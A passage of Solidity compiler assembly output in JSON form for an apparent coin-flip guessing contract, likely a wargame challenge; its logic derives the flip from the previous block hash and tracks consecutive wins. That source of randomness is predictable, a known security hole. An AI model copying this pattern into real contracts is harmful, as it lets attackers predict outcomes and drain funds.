											"end": 712,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 57,
											"end": 712,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 57,
											"end": 712,
											"name": "tag",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 57,
											"end": 712,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 57,
											"end": 712,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 57,
											"end": 712,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 57,
											"end": 712,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 57,
											"end": 712,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 57,
											"end": 712,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 57,
											"end": 712,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 57,
											"end": 712,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 57,
											"end": 712,
											"name": "CALLDATALOAD",
											"source": 0
										},
										{
											"begin": 57,
											"end": 712,
											"name": "PUSH",
											"source": 0,
											"value": "E0"
										},
										{
											"begin": 57,
											"end": 712,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 57,
											"end": 712,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 57,
											"end": 712,
											"name": "PUSH",
											"source": 0,
											"value": "1D263F67"
										},
										{
											"begin": 57,
											"end": 712,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 57,
											"end": 712,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 57,
											"end": 712,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 57,
											"end": 712,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 57,
											"end": 712,
											"name": "PUSH",
											"source": 0,
											"value": "E6F334D7"
										},
										{
											"begin": 57,
											"end": 712,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 57,
											"end": 712,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 57,
											"end": 712,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 57,
											"end": 712,
											"name": "tag",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 57,
											"end": 712,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 57,
											"end": 712,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 57,
											"end": 712,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 57,
											"end": 712,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 281,
											"end": 710,
											"name": "tag",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 281,
											"end": 710,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 281,
											"end": 710,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 281,
											"end": 710,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 281,
											"end": 710,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 281,
											"end": 710,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 281,
											"end": 710,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 281,
											"end": 710,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 281,
											"end": 710,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 281,
											"end": 710,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 281,
											"end": 710,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 281,
											"end": 710,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 281,
											"end": 710,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 281,
											"end": 710,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "7"
										},
										{
											"begin": 281,
											"end": 710,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 281,
											"end": 710,
											"name": "tag",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 281,
											"end": 710,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 281,
											"end": 710,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "8"
										},
										{
											"begin": 281,
											"end": 710,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 281,
											"end": 710,
											"name": "tag",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 281,
											"end": 710,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 281,
											"end": 710,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 281,
											"end": 710,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 281,
											"end": 710,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 281,
											"end": 710,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 281,
											"end": 710,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 281,
											"end": 710,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "10"
										},
										{
											"begin": 281,
											"end": 710,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 281,
											"end": 710,
											"name": "tag",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 281,
											"end": 710,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 281,
											"end": 710,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 281,
											"end": 710,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 281,
											"end": 710,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 281,
											"end": 710,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 281,
											"end": 710,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 281,
											"end": 710,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 281,
											"end": 710,
											"name": "RETURN",
											"source": 0
										},
										{
											"begin": 80,
											"end": 110,
											"name": "tag",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 80,
											"end": 110,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 80,
											"end": 110,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 80,
											"end": 110,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 80,
											"end": 110,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 80,
											"end": 110,
											"name": "tag",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 80,
											"end": 110,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 80,
											"end": 110,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 80,
											"end": 110,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 80,
											"end": 110,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "13"
										},
										{
											"begin": 80,
											"end": 110,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 80,
											"end": 110,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 80,
											"end": 110,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "14"
										},
										{
											"begin": 80,
											"end": 110,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 80,
											"end": 110,
											"name": "tag",
											"source": 0,
											"value": "13"
										},
										{
											"begin": 80,
											"end": 110,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 80,
											"end": 110,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 80,
											"end": 110,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 80,
											"end": 110,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 80,
											"end": 110,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 80,
											"end": 110,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 80,
											"end": 110,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 80,
											"end": 110,
											"name": "RETURN",
											"source": 0
										},
										{
											"begin": 281,
											"end": 710,
											"name": "tag",
											"source": 0,
											"value": "8"
										},
										{
											"begin": 281,
											"end": 710,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 324,
											"end": 328,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 336,
											"end": 354,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 390,
											"end": 391,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 375,
											"end": 387,
											"name": "NUMBER",
											"source": 0
										},
										{
											"begin": 375,
											"end": 391,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "16"
										},
										{
											"begin": 375,
											"end": 391,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 375,
											"end": 391,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 375,
											"end": 391,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "17"
										},
										{
											"begin": 375,
											"end": 391,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 375,
											"end": 391,
											"name": "tag",
											"source": 0,
											"value": "16"
										},
										{
											"begin": 375,
											"end": 391,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 365,
											"end": 392,
											"name": "BLOCKHASH",
											"source": 0
										},
										{
											"begin": 357,
											"end": 393,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 357,
											"end": 393,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 336,
											"end": 393,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 336,
											"end": 393,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 416,
											"end": 426,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 404,
											"end": 412,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 404,
											"end": 412,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 404,
											"end": 426,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 400,
											"end": 451,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "18"
										},
										{
											"begin": 400,
											"end": 451,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 436,
											"end": 444,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 436,
											"end": 444,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 436,
											"end": 444,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 400,
											"end": 451,
											"name": "tag",
											"source": 0,
											"value": "18"
										},
										{
											"begin": 400,
											"end": 451,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 468,
											"end": 478,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 457,
											"end": 465,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 457,
											"end": 478,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 457,
											"end": 478,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 457,
											"end": 478,
											"name": "SSTORE",
											"source": 0
										},
										{
											"begin": 457,
											"end": 478,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 484,
											"end": 500,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 516,
											"end": 522,
											"name": "PUSH",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 516,
											"end": 522,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 503,
											"end": 513,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 503,
											"end": 522,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "19"
										},
										{
											"begin": 503,
											"end": 522,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 503,
											"end": 522,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 503,
											"end": 522,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 503,
											"end": 522,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 503,
											"end": 522,
											"name": "tag",
											"source": 0,
											"value": "19"
										},
										{
											"begin": 503,
											"end": 522,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 484,
											"end": 522,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 484,
											"end": 522,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 528,
											"end": 537,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 552,
											"end": 553,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 540,
											"end": 548,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 540,
											"end": 553,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 540,
											"end": 568,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "21"
										},
										{
											"begin": 540,
											"end": 568,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 563,
											"end": 568,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 540,
											"end": 568,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "22"
										},
										{
											"begin": 540,
											"end": 568,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 540,
											"end": 568,
											"name": "tag",
											"source": 0,
											"value": "21"
										},
										{
											"begin": 540,
											"end": 568,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 556,
											"end": 560,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 540,
											"end": 568,
											"name": "tag",
											"source": 0,
											"value": "22"
										},
										{
											"begin": 540,
											"end": 568,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 528,
											"end": 568,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 528,
											"end": 568,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 587,
											"end": 593,
											"name": "DUP5",
											"source": 0
										},
										{
											"begin": 579,
											"end": 593,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 579,
											"end": 593,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 579,
											"end": 583,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 579,
											"end": 593,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 579,
											"end": 593,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 579,
											"end": 593,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 575,
											"end": 706,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "23"
										},
										{
											"begin": 575,
											"end": 706,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 603,
											"end": 618,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 603,
											"end": 618,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 603,
											"end": 620,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 603,
											"end": 620,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 603,
											"end": 620,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 603,
											"end": 620,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 603,
											"end": 620,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 603,
											"end": 620,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 603,
											"end": 620,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "24"
										},
										{
											"begin": 603,
											"end": 620,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 603,
											"end": 620,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "25"
										},
										{
											"begin": 603,
											"end": 620,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 603,
											"end": 620,
											"name": "tag",
											"source": 0,
											"value": "24"
										},
										{
											"begin": 603,
											"end": 620,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 603,
											"end": 620,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 603,
											"end": 620,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 603,
											"end": 620,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 603,
											"end": 620,
											"name": "SSTORE",
											"source": 0
										},
										{
											"begin": 603,
											"end": 620,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 635,
											"end": 639,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 628,
											"end": 639,
											"name": "SWAP4",
											"source": 0
										},
										{
											"begin": 628,
											"end": 639,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 628,
											"end": 639,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 628,
											"end": 639,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 628,
											"end": 639,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 628,
											"end": 639,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "15"
										},
										{
											"begin": 628,
											"end": 639,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 575,
											"end": 706,
											"name": "tag",
											"source": 0,
											"value": "23"
										},
										{
											"begin": 575,
											"end": 706,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 678,
											"end": 679,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 660,
											"end": 675,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 660,
											"end": 679,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 660,
											"end": 679,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 660,
											"end": 679,
											"name": "SSTORE",
											"source": 0
										},
										{
											"begin": 660,
											"end": 679,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 694,
											"end": 699,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 687,
											"end": 699,
											"name": "SWAP4",
											"source": 0
										},
										{
											"begin": 687,
											"end": 699,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 687,
											"end": 699,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 687,
											"end": 699,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 687,
											"end": 699,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 281,
											"end": 710,
											"name": "tag",
											"source": 0,
											"value": "15"
										},
										{
											"begin": 281,
											"end": 710,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 281,
											"end": 710,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 281,
											"end": 710,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 281,
											"end": 710,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 281,
											"end": 710,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 80,
											"end": 110,
											"name": "tag",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 80,
											"end": 110,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 80,
											"end": 110,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 80,
											"end": 110,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 80,
											"end": 110,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 80,
											"end": 110,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 88,
											"end": 205,
											"name": "tag",
											"source": 2,
											"value": "28"
										},
										{
											"begin": 88,
											"end": 205,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 197,
											"end": 198,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 194,
											"end": 195,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 187,
											"end": 199,
											"name": "REVERT",
											"source": 2
										},
										{
											"begin": 334,
											"end": 424,
											"name": "tag",
											"source": 2,
											"value": "30"
										},
										{
											"begin": 334,
											"end": 424,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 368,
											"end": 375,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 411,
											"end": 416,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 404,
											"end": 417,
											"name": "ISZERO",
											"source": 2
										},
										{
											"begin": 397,
											"end": 418,
											"name": "ISZERO",
											"source": 2
										},
										{
											"begin": 386,
											"end": 418,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 386,
											"end": 418,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 334,
											"end": 424,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 334,
											"end": 424,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 334,
											"end": 424,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 334,
											"end": 424,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 430,
											"end": 546,
											"name": "tag",
											"source": 2,
											"value": "31"
										},
										{
											"begin": 430,
											"end": 546,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 500,
											"end": 521,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "44"
										},
										{
											"begin": 515,
											"end": 520,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 500,
											"end": 521,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "30"
										},
										{
											"begin": 500,
											"end": 521,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 500,
											"end": 521,
											"name": "tag",
											"source": 2,
											"value": "44"
										},
										{
											"begin": 500,
											"end": 521,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 493,
											"end": 498,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 490,
											"end": 522,
											"name": "EQ",
											"source": 2
										},
										{
											"begin": 480,
											"end": 540,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "45"
										},
										{
											"begin": 480,
											"end": 540,
											"name": "JUMPI",
											"source": 2
										},
										{
											"begin": 536,
											"end": 537,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 533,
											"end": 534,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 526,
											"end": 538,
											"name": "REVERT",
											"source": 2
										},
										{
											"begin": 480,
											"end": 540,
											"name": "tag",
											"source": 2,
											"value": "45"
										},
										{
											"begin": 480,
											"end": 540,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 430,
											"end": 546,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 430,
											"end": 546,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 552,
											"end": 685,
											"name": "tag",
											"source": 2,
											"value": "32"
										},
										{
											"begin": 552,
											"end": 685,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 595,
											"end": 600,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 633,
											"end": 639,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 620,
											"end": 640,
											"name": "CALLDATALOAD",
											"source": 2
										},
										{
											"begin": 611,
											"end": 640,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 611,
											"end": 640,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 649,
											"end": 679,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "47"
										},
										{
											"begin": 673,
											"end": 678,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 649,
											"end": 679,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "31"
										},
										{
											"begin": 649,
											"end": 679,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 649,
											"end": 679,
											"name": "tag",
											"source": 2,
											"value": "47"
										},
										{
											"begin": 649,
											"end": 679,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 552,
											"end": 685,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 552,
											"end": 685,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 552,
											"end": 685,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 552,
											"end": 685,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 552,
											"end": 685,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 691,
											"end": 1014,
											"name": "tag",
											"source": 2,
											"value": "7"
										},
										{
											"begin": 691,
											"end": 1014,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 747,
											"end": 753,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 796,
											"end": 798,
											"name": "PUSH",
											"source": 2,
											"value": "20"
										},
										{
											"begin": 784,
											"end": 793,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 775,
											"end": 782,
											"name": "DUP5",
											"source": 2
										},
										{
											"begin": 771,
											"end": 794,
											"name": "SUB",
											"source": 2
										},
										{
											"begin": 767,
											"end": 799,
											"name": "SLT",
											"source": 2
										},
										{
											"begin": 764,
											"end": 883,
											"name": "ISZERO",
											"source": 2
										},
										{
											"begin": 764,
											"end": 883,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "49"
										},
										{
											"begin": 764,
											"end": 883,
											"name": "JUMPI",
											"source": 2
										},
										{
											"begin": 802,
											"end": 881,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "50"
										},
										{
											"begin": 802,
											"end": 881,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "28"
										},
										{
											"begin": 802,
											"end": 881,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 802,
											"end": 881,
											"name": "tag",
											"source": 2,
											"value": "50"
										},
										{
											"begin": 802,
											"end": 881,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 764,
											"end": 883,
											"name": "tag",
											"source": 2,
											"value": "49"
										},
										{
											"begin": 764,
											"end": 883,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 922,
											"end": 923,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 947,
											"end": 997,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "51"
										},
										{
											"begin": 989,
											"end": 996,
											"name": "DUP5",
											"source": 2
										},
										{
											"begin": 980,
											"end": 986,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 969,
											"end": 978,
											"name": "DUP6",
											"source": 2
										},
										{
											"begin": 965,
											"end": 987,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 947,
											"end": 997,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "32"
										},
										{
											"begin": 947,
											"end": 997,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 947,
											"end": 997,
											"name": "tag",
											"source": 2,
											"value": "51"
										},
										{
											"begin": 947,
											"end": 997,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 937,
											"end": 997,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 937,
											"end": 997,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 893,
											"end": 1007,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 691,
											"end": 1014,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 691,
											"end": 1014,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 691,
											"end": 1014,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 691,
											"end": 1014,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 691,
											"end": 1014,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 1020,
											"end": 1129,
											"name": "tag",
											"source": 2,
											"value": "33"
										},
										{
											"begin": 1020,
											"end": 1129,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1101,
											"end": 1122,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "53"
										},
										{
											"begin": 1116,
											"end": 1121,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 1101,
											"end": 1122,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "30"
										},
										{
											"begin": 1101,
											"end": 1122,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 1101,
											"end": 1122,
											"name": "tag",
											"source": 2,
											"value": "53"
										},
										{
											"begin": 1101,
											"end": 1122,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1096,
											"end": 1099,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1089,
											"end": 1123,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 1020,
											"end": 1129,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1020,
											"end": 1129,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1020,
											"end": 1129,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 1135,
											"end": 1345,
											"name": "tag",
											"source": 2,
											"value": "10"
										},
										{
											"begin": 1135,
											"end": 1345,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1222,
											"end": 1226,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1260,
											"end": 1262,
											"name": "PUSH",
											"source": 2,
											"value": "20"
										},
										{
											"begin": 1249,
											"end": 1258,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1245,
											"end": 1263,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 1237,
											"end": 1263,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 1237,
											"end": 1263,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1273,
											"end": 1338,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "55"
										},
										{
											"begin": 1335,
											"end": 1336,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
